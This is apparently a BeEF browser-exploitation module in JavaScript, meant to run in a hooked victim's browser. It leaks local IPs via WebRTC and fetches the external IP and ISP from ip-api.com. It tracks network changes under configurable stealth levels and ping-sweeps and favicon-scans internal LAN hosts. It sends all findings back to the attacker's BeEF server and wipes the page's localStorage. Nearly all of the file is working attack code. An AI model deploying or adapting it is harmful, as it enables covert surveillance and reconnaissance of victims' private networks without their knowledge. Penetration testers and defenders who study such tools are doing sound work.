
//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  verbLog('top of function..');

  var verbLogEnabled = true;
  var saveLocal = false;
  var onlineStatus = false;
  var rtcIps = "";
  var externalIp = "";
  var isp = "";
  var pollTimeout = 20000;
  var netcount = 0;
  var ts = null;
  // stealthLevel
  // 1 - not too stealthy, when we see a new network we will:
  //   - * immediately probe for external stuff
  //   - * immediately send data back to beef (or try)
  // 2 - sort of stealthy, when we see a new network we will:
  //   - * immediately probe for external stuff
  //   - * NOT send back to beef until we return to original network
  // 3 - very stealthy, when we see a new network we will:
  //   - * NOT probe for external information
  //   - * NOT send back to beef until we return to original network
  var stealthLevel = 1;

  // globals
  agTimer = null;
  agOnlineIntervalTimer = null;

  function printStatus(sendtobeef) {
    var sendtobeef = typeof sendtobeef !== 'undefined' ? sendtobeef : false;

    verbLog("Online Status: '" + onlineStatus + "'");
    verbLog("RTC IPs: '" + rtcIps+ "'");
    verbLog("External IP: '" + externalIp + "'");
    verbLog("ISP: '" + isp + "'");

    if (sendtobeef == true) {
      beef.net.send('<%= @command_url %>', <%= @command_id %>,
                    "OnlineStatus="+onlineStatus+"&RtcIps="+rtcIps+
                    "&ExternalIp="+externalIp+"&isp="+isp);
    }
  }

  function getOnlineState() {
    // https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine
    return window.navigator.onLine;
  }

  function checkOnlineState() {
    var newState = getOnlineState();
    if (onlineStatus !== newState) {
      clearInterval(agOnlineIntervalTimer); // clear the interval 
      clearTimeout(agTimer); // clear the timeout

      verbLog("online status changed!");

      presenceCheck();
    }
  }

  function get_http_servers_mod(input) {

      verbLog('Running GET HTTP SERVERS against "'+ input +'"');

      var ips     = input;
      var ports   = "80,8080,8081";
      var timeout = parseInt("10", 10)*1000;
      var wait    = parseInt("5", 10)*1000;
      var threads = parseInt("3", 10);
      // var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');
      var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png', '/icons/apache_pb2.gif');
    
      if(beef.browser.isO()) {
        beef.debug("[Favicon Scanner] Browser is not supported.");
        verbLog("fail - unsupported browser");
        beef.net.send('<%= @command_url %>', <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
        return;
      }

      verbLog("pased isO() test");
    
      var sort_unique = function (arr) {
        arr = arr.sort(function (a, b) { return a*1 - b*1; });
        var ret = [arr[0]];
        for (var i = 1; i < arr.length; i++) {
            if (arr[i-1] !== arr[i]) {
                ret.push(arr[i]);
            }
        }
        return ret;
      }
    
      // set target ports
      var is_valid_port = function(port) {
        if (isNaN(port)) return false;
        if (port > 65535 || port < 0) return false;
        return true;
      }
      ports = ports.split(',');
      var target_ports = new Array();
      for (var i=0; i<ports.length; i++) {
        var p = ports[i].replace(/(^\s+|\s+$)/g, '');
        if (is_valid_port(p)) target_ports.push(p);
      }
      ports = sort_unique(target_ports);
      if (ports.length == 0) {
        verbLog("fail - no ports specified");
        beef.net.send('<%= @command_url %>', <%= @command_id %>, "fail=no ports specified", beef.are.status_error());
        return;
      }
      verbLog("passed ports sorting test - with valid ports");
    
      // set target IP addresses
      var is_valid_ip = function(ip) {
        if (ip == null) return false;
        var ip_match = String(ip).match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
        if (ip_match == null) return false;
        return true;
      }
      var is_valid_ip_range = function(ip_range) {
        if (ip_range == null) return false;
        var range_match = String(ip_range).match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
        if (range_match == null || range_match[1] == null) return false;
        return true;
      }
      if (ips == 'common') {
        ips = [
          '192.168.0.1',
          '192.168.0.100',
          '192.168.0.254',
          '192.168.1.1',
          '192.168.1.100',
          '192.168.1.254',
          '10.0.0.1',
          '10.1.1.1',
          '192.168.2.1',
          '192.168.2.254',
          '192.168.100.1',
          '192.168.100.254',
          '192.168.123.1',
          '192.168.123.254',
          '192.168.10.1',
          '192.168.10.254' ];
      } else if (is_valid_ip(ips)) {
        ips = [ips];
      } else {
        ips = ips.split(',');
        var target_ips = new Array();
        for (var i=0; i<ips.length; i++) {
          var ip = ips[i].replace(/(^\s+|\s+$)/g, '');
          if (is_valid_ip(ip)) target_ips.push(ip);
          else if (is_valid_ip_range(ip)) {
            ipBounds   = ip.split('-');
            lowerBound = ipBounds[0].split('.')[3];
            upperBound = ipBounds[1].split('.')[3];
            for (var i = lowerBound; i <= upperBound; i++) {
              target_ips.push(ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i);
            }
          }
        }
        ips = sort_unique(target_ips);
        if (ips.length == 0) {
            verbLog("fail - malformed target IP address(es) supplied");
            beef.net.send('<%= @command_url %>', <%= @command_id %>, "fail=malformed target IP address(es) supplied", beef.are.status_error());
            return;
        }
      }

      // request the specified paths from the specified URL
      // and report all live URLs back to BeEF
      checkFavicon = function(proto, ip, port, uri) {
        var img = new Image;
        var dom = beef.dom.createInvisibleIframe();
        beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
        img.src = proto+"://"+ip+":"+port+uri;
        img.onerror = function() { dom.removeChild(this); }
        img.onload = function() {
          verbLog("proto="+proto+", ip="+ip+", port="+port+", url="+escape(this.src));
          beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
          beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
        }
        dom.appendChild(img);
        // stop & remove iframe
        setTimeout(function() {
          if (dom.contentWindow.stop !== undefined) {
            dom.contentWindow.stop();
          } else if (dom.contentWindow.document.execCommand !== undefined) {
            dom.contentWindow.document.execCommand("Stop", false);
          }
          document.body.removeChild(dom);
        }, timeout);
      }
    
      // configure workers
      WorkerQueue = function(id, frequency) {
        var stack = [];
        var timer = null;
        var frequency = frequency;
        var start_scan = (new Date).getTime();
        this.process = function() {
          var item = stack.shift();
          eval(item);
          if (stack.length === 0) {
            clearInterval(timer);
            timer = null;
            var interval = (new Date).getTime() - start_scan;
            beef.debug("[Favicon Scanner] Worker #"+id+" has finished ["+interval+" ms]");
            return;
          }
        }
        this.queue = function(item) {
          stack.push(item);
          if (timer === null) timer = setInterval(this.process, frequency);
        }
      }
    
      // create workers
      var workers = new Array();
      for (var id = 0; id < threads; id++) workers.push(new WorkerQueue(id, wait));
    
      // for each favicon path:
      for (var u=0; u < urls.length; u++) {
        var worker = workers[u % threads];
        // for each LAN IP address:
        for (var i=0; i < ips.length; i++) {
          // for each port:
          for (var p=0; p < ports.length; p++) {
            var host = ips[i];
            var port = ports[p];
            if (port == '443') var proto = 'https'; else var proto = 'http';
            // add URL to worker queue
            worker.queue('checkFavicon("'+proto+'","'+host+'","'+port+'","'+urls[u]+'");');
            verbLog("added to queue");
          }
        }
      }
  }

  var get_http_servers_can_exec = true;
  var get_http_servers_mod_output = null;

  var outer_sequential_mod_output = null;

  function outer_sequential() {
      function get_http_servers_f(){
          if (get_http_servers_can_exec){
              var s=outer_sequential_mod_output.split('.');
              var start = s[0]+'.'+s[1]+'.0.67';
              var end = s[0]+'.'+s[1]+'.0.71';
              var mod_input = start+'-'+end;
              get_http_servers_mod(mod_input);
          }
      }
      get_http_servers_f();
  }

  function get_http_servers(input) {

      verbLog('Running GET HTTP SERVERS against "'+ input +'"');

      var ips     = input;
      var ports   = "80,8080,8081";
      var timeout = parseInt("10", 10)*1000;
      var wait    = parseInt("5", 10)*1000;
      var threads = parseInt("3", 10);
      // var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png');
      var urls    = new Array('/favicon.ico', '/favicon.png', '/images/favicon.ico', '/images/favicon.png', '/icons/apache_pb2.gif');
    
      if(beef.browser.isO()) {
        beef.debug("[Favicon Scanner] Browser is not supported.");
        verbLog("fail - unsupported browser");
        beef.net.send('<%= @command_url %>', <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
        return;
      }

      verbLog("pased isO() test");
    
      var sort_unique = function (arr) {
        arr = arr.sort(function (a, b) { return a*1 - b*1; });
        var ret = [arr[0]];
        for (var i = 1; i < arr.length; i++) {
            if (arr[i-1] !== arr[i]) {
                ret.push(arr[i]);
            }
        }
        return ret;
      }
    
      // set target ports
      var is_valid_port = function(port) {
        if (isNaN(port)) return false;
        if (port > 65535 || port < 0) return false;
        return true;
      }
      ports = ports.split(',');
      var target_ports = new Array();
      for (var i=0; i<ports.length; i++) {
        var p = ports[i].replace(/(^\s+|\s+$)/g, '');
        if (is_valid_port(p)) target_ports.push(p);
      }
      ports = sort_unique(target_ports);
      if (ports.length == 0) {
        verbLog("fail - no ports specified");
        beef.net.send('<%= @command_url %>', <%= @command_id %>, "fail=no ports specified", beef.are.status_error());
        return;
      }
      verbLog("passed ports sorting test - with valid ports");
    
      // set target IP addresses
      var is_valid_ip = function(ip) {
        if (ip == null) return false;
        var ip_match = String(ip).match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
        if (ip_match == null) return false;
        return true;
      }
      var is_valid_ip_range = function(ip_range) {
        if (ip_range == null) return false;
        var range_match = String(ip_range).match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
        if (range_match == null || range_match[1] == null) return false;
        return true;
      }
      if (ips == 'common') {
        ips = [
          '192.168.0.1',
          '192.168.0.100',
          '192.168.0.254',
          '192.168.1.1',
          '192.168.1.100',
          '192.168.1.254',
          '10.0.0.1',
          '10.1.1.1',
          '192.168.2.1',
          '192.168.2.254',
          '192.168.100.1',
          '192.168.100.254',
          '192.168.123.1',
          '192.168.123.254',
          '192.168.10.1',
          '192.168.10.254' ];
      } else if (is_valid_ip(ips)) {
        ips = [ips];
      } else {
        ips = ips.split(',');
        var target_ips = new Array();
        for (var i=0; i<ips.length; i++) {
          var ip = ips[i].replace(/(^\s+|\s+$)/g, '');
          if (is_valid_ip(ip)) target_ips.push(ip);
          else if (is_valid_ip_range(ip)) {
            ipBounds   = ip.split('-');
            lowerBound = ipBounds[0].split('.')[3];
            upperBound = ipBounds[1].split('.')[3];
            for (var i = lowerBound; i <= upperBound; i++) {
              target_ips.push(ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i);
            }
          }
        }
        ips = sort_unique(target_ips);
        if (ips.length == 0) {
            verbLog("fail - malformed target IP address(es) supplied");
            beef.net.send('<%= @command_url %>', <%= @command_id %>, "fail=malformed target IP address(es) supplied", beef.are.status_error());
            return;
        }
      }

      // request the specified paths from the specified URL
      // and report all live URLs back to BeEF
      checkFavicon = function(proto, ip, port, uri) {
        var img = new Image;
        var dom = beef.dom.createInvisibleIframe();
        beef.debug("[Favicon Scanner] Checking IP [" + ip + "] (" + proto + ")");
        img.src = proto+"://"+ip+":"+port+uri;
        img.onerror = function() { dom.removeChild(this); }
        img.onload = function() {
          verbLog("proto="+proto+", ip="+ip+", port="+port+", url="+escape(this.src));
          beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
          beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
        }
        dom.appendChild(img);
        // stop & remove iframe
        setTimeout(function() {
          if (dom.contentWindow.stop !== undefined) {
            dom.contentWindow.stop();
          } else if (dom.contentWindow.document.execCommand !== undefined) {
            dom.contentWindow.document.execCommand("Stop", false);
          }
          document.body.removeChild(dom);
        }, timeout);
      }
    
      // configure workers
      WorkerQueue = function(id, frequency) {
        var stack = [];
        var timer = null;
        var frequency = frequency;
        var start_scan = (new Date).getTime();
        this.process = function() {
          var item = stack.shift();
          eval(item);
          if (stack.length === 0) {
            clearInterval(timer);
            timer = null;
            var interval = (new Date).getTime() - start_scan;
            beef.debug("[Favicon Scanner] Worker #"+id+" has finished ["+interval+" ms]");
            return;
          }
        }
        this.queue = function(item) {
          stack.push(item);
          if (timer === null) timer = setInterval(this.process, frequency);
        }
      }
    
      // create workers
      var workers = new Array();
      for (var id = 0; id < threads; id++) workers.push(new WorkerQueue(id, wait));
    
      // for each favicon path:
      for (var u=0; u < urls.length; u++) {
        var worker = workers[u % threads];
        // for each LAN IP address:
        for (var i=0; i < ips.length; i++) {
          // for each port:
          for (var p=0; p < ports.length; p++) {
            var host = ips[i];
            var port = ports[p];
            if (port == '443') var proto = 'https'; else var proto = 'http';
            // add URL to worker queue
            worker.queue('checkFavicon("'+proto+'","'+host+'","'+port+'","'+urls[u]+'");');
            verbLog("added to queue");
          }
        }
      }
  }

  function ping_sweep(rhosts, paramThreads, success) {
  
    var ips = new Array();
    var threads = parseInt(paramThreads, 10) || 3;
    var timeout = 1000;
  
    if(!beef.browser.hasCors()) {
      verbLog("Browser doesn't support CORS");
      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
      return;
    }
  
    // set target IP addresses
    if (rhosts == 'common') {
      // use default IPs
      ips = [
        '192.168.0.1',
        '192.168.0.100',
        '192.168.0.254',
        '192.168.1.1',
        '192.168.1.100',
        '192.168.1.254',
        '10.0.0.1',
        '10.1.1.1',
        '192.168.2.1',
        '192.168.2.254',
        '192.168.100.1',
        '192.168.100.254',
        '192.168.123.1',
        '192.168.123.254',
        '192.168.10.1',
        '192.168.10.254'
      ];
    } else {
      // set target IP range
      var range = rhosts.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
      if (range == null || range[1] == null) {
        verbLog("malformed IP range supplied");
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
        return;
      }
      ipBounds   = rhosts.split('-');
      lowerBound = ipBounds[0].split('.')[3];
      upperBound = ipBounds[1].split('.')[3];
      for (var i = lowerBound; i <= upperBound; i++){
        ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
        ips.push(ipToTest);
      }
    }
  
    WorkerQueue = function(frequency) {
  
      var stack = [];
      var timer = null;
      var frequency = frequency;
      var start_scan = (new Date).getTime();
  
      this.process = function() {
        var item = stack.shift();
        eval(item);
        if (stack.length === 0) {
          clearInterval(timer);
          timer = null;
          var interval = (new Date).getTime() - start_scan;
          verbLog("[Ping Sweep] Worker queue is complete ["+interval+" ms]");
          beef.debug("[Ping Sweep] Worker queue is complete ["+interval+" ms]");
          return;
        }
      }
  
      this.queue = function(item) {
        stack.push(item);
        if (timer === null) timer = setInterval(this.process, frequency);
      }
  
    }
  
    // create workers
    var workers = new Array();
    for (w=0; w < threads; w++) workers.push(new WorkerQueue(timeout));
  
    verbLog("[Ping Sweep] Starting scan ("+(ips.length)+" URLs / "+threads+" workers)");
    beef.debug("[Ping Sweep] Starting scan ("+(ips.length)+" URLs / "+threads+" workers)");

    ag_ipCounter = ips.length;
    ag_lanIps = new Array();

    ag_lanReturn = function() {
        success(ag_lanIps.join(","));
    }


    for (var i=0; i < ips.length; i++) {
      var worker = workers[i % threads];
      var ip = ips[i];
      // use a high port likely to be closed/filtered (60000 - 65000)
      var port = Math.floor(Math.random() * 5000) + 60000;
      worker.queue('var start_time = new Date().getTime();' +
        'beef.net.cors.request(' +
          '"GET", "https://'+ip+':'+port+'/", "", '+timeout+', function(response) {' +
            'var current_time = new Date().getTime();' +
            'var duration = current_time - start_time;' +
            'if (duration < '+timeout+') {' +
              'verbLog("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
              'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
              'verbLog("ip='+ip+'&ping="+duration+"ms");' +
              'ag_lanIps.push("'+ip+'");' + 
              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.are.status_success());' +
            '} else {' +
              'verbLog("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
              'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
            '}' +
            'ag_ipCounter--;' +
            'if (ag_ipCounter == 0) {' +
                'verbLog("FINISHED");' +
                'success(ag_lanIps);' +
            '}' +
        '});'
      );
    }
  }

  // This is yanked from the WebRTC IP Module
  function getRtcIp(success, failure) {
    var RTCPeerConnection = window.webkitRTCPeerConnection ||
                            window.mozRTCPeerConnection;

    if (RTCPeerConnection){

        var addrs = Object.create(null);
        addrs["0.0.0.0"] = false;

        // Construct RTC peer connection
        var servers = {iceServers:[]};
        var mediaConstraints = {optional:[{googIPv6: true}]};
        var rtc = new RTCPeerConnection(servers, mediaConstraints);
        rtc.createDataChannel('', {reliable:false});

        // Upon an ICE candidate being found
        // Grep the SDP data for IP address data
        rtc.onicecandidate = function (evt) {
          if (evt.candidate){
            grepSDP("a="+evt.candidate.candidate);
          }
        };

        // Create an SDP offer
        rtc.createOffer(function (offerDesc) {
            grepSDP(offerDesc.sdp);
            rtc.setLocalDescription(offerDesc);
        }, function (e) {
          // failed SDP offer - do nothing
          failure("failed SDP offer");
        });

        // Return results
        function processIPs(newAddr) {
            // check here for only ipv4 // HACK
            if (newAddr.length > 15) {
                return;
            }
            if (newAddr in addrs) return;
            else addrs[newAddr] = true;
            var displayAddrs = Object.keys(addrs).filter(function (k) {
                return addrs[k];
            });
            success(displayAddrs.join(","));
        }


        // Retrieve IP addresses from SDP 
        function grepSDP(sdp) {
            var hosts = [];
            // c.f. http://tools.ietf.org/html/rfc4566#page-39
            sdp.split('\r\n').forEach(function (line) {
                // http://tools.ietf.org/html/rfc4566#section-5.13
                if (~line.indexOf("a=candidate")) {
                    // http://tools.ietf.org/html/rfc5245#section-15.1
                    var parts = line.split(' '),
                        addr = parts[4],
                        type = parts[7];
                    if (type === 'host') processIPs(addr);
                           // http://tools.ietf.org/html/rfc4566#section-5.7
                } else if (~line.indexOf("c=")) {
                    var parts = line.split(' '),
                        addr = parts[2];
                    processIPs(addr);
                }
            });
        }
    }else {
      failure("Doesnt support RTC");
    }

  }

  // This function reaches out to <site> to get info
  // TODO: This should have 'failure' async method handling too
  function getExternalDetails(completion) {
    var xhttp3 = new XMLHttpRequest();
    xhttp3.onreadystatechange = function() {
        if (xhttp3.readyState == 4 && xhttp3.status == 200) {
            completion(xhttp3.responseText);
        }
    };
    xhttp3.open("GET", "http://ip-api.com/json?rnd="+Date.now(), true);
    xhttp3.send(); 
  }

  // This doesn't seem to work .. 
  // But it does work on FF?
  $j(document).on('online offline',function(e) {
    verbLog("gone "+e.type);
  });

  // Check if we can use localStorage
  function storageAvailable(type) {
    try {
      var storage = window[type], x = '__storage_test__';
        storage.setItem(x, x);
        storage.removeItem(x);
        return true;
      }
      catch(e) {
        return false;
      }
  }

  // Save state .. into localStorage if available
  // TODO: This should maybe save a json/data struct into some B64 encoded blob?
  function saveState(saveLocal, id, online, rtc, ip, isp) {
    if (saveLocal == true) {
      localStorage.setItem('rtc_'+id, rtc);
      onlineStatus = online;
      localStorage.setItem('ip_'+id, ip);
      localStorage.setItem('isp_'+id, isp);
      localStorage.setItem('ts_'+id, Date.now());
    } // else ? what then?
  }

  // This tries to figure out where we are
  // In all instances, at the end, it should re-kick off the timers
  function presenceCheck() {
    // how long have I been away for?
    var prevStamp = ts;
    verbLog("prev: " + Math.round(prevStamp/1000));
    verbLog("Now: " + Math.round(Date.now()/1000));

    if ((Math.round(prevStamp/1000)+60) < (Math.round(Date.now()/1000))) {
      // it's been longer than a minute!
      verbLog("It's been longer than a minute - what's happened?");
    
      startTimers();
    } else {
      // it's been less than a minute
      verbLog("It's been less than a minute - what's happened?");
      // do we want to double-check RTC? For instance, if we've gone from
      // GSM to WiFi?

      // check changes to online status
      var freshOnlineStatus = getOnlineState();
      if ((freshOnlineStatus.toString().toUpperCase()) === 
              onlineStatus.toString().toUpperCase()) {
        // we havent' changed status - apparently?
        verbLog("we haven't changed online status");

        startTimers();
      } else {
        // we are now in a different online state.
        verbLog("we are now in a different state. freshOnlineStatus:");
        verbLog("'" + freshOnlineStatus.toString() + "'");

        if ((freshOnlineStatus.toString().toUpperCase()) === "FALSE") {
          // we are now offline from being online
          verbLog("we are now offline ... ");
          onlineStatus = freshOnlineStatus;

          startTimers();
        } else {
          // we are now online from offline
          verbLog("we are back online!..");
          verbLog("do checks here..");

          getRtcIp(function(e) {
            if (checkPreviousRtc(e)) {
              // rtc hasn't changed
              verbLog("rtc hasn't changed");
              onlineStatus = freshOnlineStatus;
  
              startTimers();
            } else {
              // check how different the IP is
              verbLog("We were: " + localStorage.getItem('rtc_'+netcount));
              verbLog("We are now: " + e);
              onlineStatus = freshOnlineStatus;
              // save a new network location object
              // kick off scan
              // store results
              netRecon(e);
              
            }

          }, function(e) {
            //rut roh - couldn't get RtcIp?
            verbLog("How?");
          });
        }
      }
    }
  }

  function checkPreviousRtc(ip) {
    var result = false;
    if (saveLocal === true) {
      for (var c = 0; c <= netcount; c++) {
        if (ip.toUpperCase() === localStorage.getItem('rtc_'+c).toUpperCase()) {
          result = true;
        }
      }
    }

    return result;
  }

  function netRecon(rtcresult) {
    verbLog("PERFORM NETWORK RECON HERE!");
    getExternalDetails(function(e) {
      externalIp = JSON.parse(e).query;
      rtcIps = rtcresult;
      isp = JSON.parse(e).isp;

      netcount++;

      if (stealthLevel === 1) {
        printStatus(true);
      } else {
        printStatus(false);
      }

      saveState(saveLocal, netcount, onlineStatus, rtcresult, externalIp, isp);

      var s=rtcIps.split('.');
      var start = s[0]+'.'+s[1]+'.'+s[2]+'.65';
      var end = s[0]+'.'+s[1]+'.'+s[2]+'.70';
      var mod_input = start+'-'+end;

      //ping_sweep(mod_input,4,get_http_servers);
      outer_sequential_mod_output = rtcIps;
      outer_sequential();


      // startTimers();
    });
  }

  function verbLog(msg) {
    if (verbLogEnabled === true) {
      var p = document.createElement("p");
      p.innerHTML = msg;
      document.body.insertBefore(p, document.body.firstChild);
      console.log(msg);
    }
  }

  function startTimers() {
    ts = Date.now();
    agTimer = setTimeout(function() {presenceCheck()}, pollTimeout);
    clearInterval(agOnlineIntervalTimer);
    agOnlineIntervalTimer = setInterval(function() {checkOnlineState()},
                                           200);
  }

  function setupPhase() {
    //redundant as we know?
    if (storageAvailable('localStorage') == true) {
      saveLocal = true;
      // clear the current localStorage?
      localStorage.clear();
    }

    onlineStatus = getOnlineState();

    getRtcIp(function(e) {
      rtcIps = e;
      getExternalDetails(function(e) {
        externalIp = JSON.parse(e).query;
        isp = JSON.parse(e).isp;

        printStatus(true);

        saveState(saveLocal, netcount, onlineStatus, rtcIps, externalIp, isp);

        // turn off beef polling
        beef.updater.lock = true;
        startTimers();

        


      });
    }, function(e) {
      //console.log("failure " + e);
    });
  }


  verbLog("about to start..");

  setupPhase();




});
